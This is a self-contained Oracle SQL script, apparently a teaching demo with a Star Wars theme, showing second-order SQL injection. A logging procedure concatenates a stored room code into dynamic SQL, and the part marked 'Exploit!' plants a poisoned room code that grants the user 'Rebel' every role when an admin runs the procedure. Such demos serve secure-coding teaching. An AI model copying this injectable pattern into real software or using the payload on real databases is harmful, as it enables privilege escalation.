
drop table log_201910;
drop table user_room_access;
drop table deathstar_rooms;
drop table user_roles;
drop table roles;
drop table users;

create table deathstar_rooms (
  id integer generated by default on null as identity primary key,
  name varchar2(200) not null,
  code varchar2(200) not null unique
);

insert into deathstar_rooms (id, name, code ) values (1, 'Engine Room 1', 'ENG1' );
insert into deathstar_rooms (id, name, code ) values (2, 'Vaders Chamber', 'VADER' );
insert into deathstar_rooms (id, name, code ) values (3, 'Bridge', 'BRIDGE' );
insert into deathstar_rooms (id, name, code ) values (4, 'Prison 1', 'PRISON1' );

create table users
(
	id        integer,
	user_name varchar2(30 char)
);

insert into users values (1, 'Dark Admin');
insert into users values (2, 'Trainee Sam');
insert into users values (3, 'Editor JarJar');
insert into users values (4, 'Rebel');

create table roles
(
	id        integer,
	role_name varchar2(30 char)
);

insert into roles values (1, 'ADMIN');
insert into roles values (2, 'READ');
insert into roles values (3, 'WRITE');

create table user_roles
(
	id_user integer,
	id_role integer
);

insert into user_roles values (1, 1);
insert into user_roles values (2, 2);
insert into user_roles values (3, 3);

create table user_room_access (
  id_user integer not null,
  id_room integer not null,
  constraint user_room_access_pk primary key ( id_user, id_room )
);

create table log_201910 (
  message varchar2(4000),
  created timestamp default current_timestamp
);

create or replace package room_info as
	procedure allow_room_access(
		i_room_id simple_integer,
		i_user_id simple_integer );
end;
/

create or replace package body room_info as
  procedure allow_room_access(
    i_room_id simple_integer,
    i_user_id simple_integer )
  as
    l_room_code varchar2(200);
    l_log_table varchar2(40) := 'LOG_'||to_char(sysdate, 'YYYYMM');
    begin
      insert into user_room_access ( id_user, id_room )
        select i_user_id, i_room_id
          from dual
          where (i_user_id, i_room_id) not in (select id_user, id_room from user_room_access);

      -- Logging: We need dyn. sql
      select code into l_room_code from deathstar_rooms where id = i_room_id;
      execute immediate '
        begin
          insert into ' || dbms_assert.simple_sql_name(l_log_table) || ' ( message )
            values (''User ' || i_user_id || ' has now access to room ' || l_room_code || ''');
        end;
      ';
    end;
end;
/

-- Exploit!

-- Poisoned room-code
update deathstar_rooms set code = 'VADER''); insert into user_roles (id_user, id_role) select u.id, r.id from users u, roles r
where (u.id, r.id) not in (select id_user, id_role from user_roles) and u.user_name in (''Rebel' where id = 2;

select * from user_roles;

-- Just wait until someone gets access to the room!
call room_info.allow_room_access(2, 1);

select * from user_roles;
select * from log_201910;